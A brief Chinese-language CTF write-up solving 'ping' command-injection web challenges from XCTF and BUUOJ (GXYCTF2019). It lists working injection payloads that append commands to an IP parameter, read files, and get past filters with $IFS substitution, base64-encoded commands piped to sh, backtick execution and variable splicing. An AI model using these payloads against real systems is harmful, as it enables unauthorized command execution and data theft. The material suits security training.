# ping

## 类型一：没有过滤可以查找的

题目地址：https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5071&page=1

127.0.0.1 | find / -name "flag.txt" （将 | 替换成 & 或 && 都可以）,查找flag所在位置

之后

127.0.0.1 | cat /home/flag.txt 可得到flag


## 类型2： 有过滤的 


题目地址：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping


### 方案一

1. ?ip=127.0.0.1;ls

2. 过滤空格了，可以用${IFS}$代替：

3. 可能也过滤了{}，用$IFS$1代替：

4. ?ip=127.0.0.1;cat$IFS$1index.php

5. ?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh          此处Y2F0IGZsYWcucGhw是cat flag.php的base64-encode


### 方案二

方法名叫内联执行
方法:将反引号内命令的输出作为输入执行

输入

?ip=127.0.0.1;cat$IFS$1`ls`


### 方法三

?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php